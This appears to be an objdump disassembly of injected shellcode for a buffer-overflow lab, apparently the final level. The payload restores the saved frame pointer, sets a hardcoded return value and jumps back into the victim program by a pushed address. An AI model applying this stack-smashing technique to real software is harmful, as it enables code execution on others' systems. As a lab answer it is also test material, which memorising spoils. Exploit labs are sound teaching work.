
level4.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:	8d 44 24 18          	lea    0x18(%esp),%eax
   4:	89 45 00             	mov    %eax,0x0(%ebp)
   7:	c7 40 fc ef be ad de 	movl   $0xdeadbeef,-0x4(%eax)
   e:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)
  15:	b8 f3 f6 16 55       	mov    $0x5516f6f3,%eax
  1a:	68 0e 8f 04 08       	push   $0x8048f0e
  1f:	c3                   	ret    
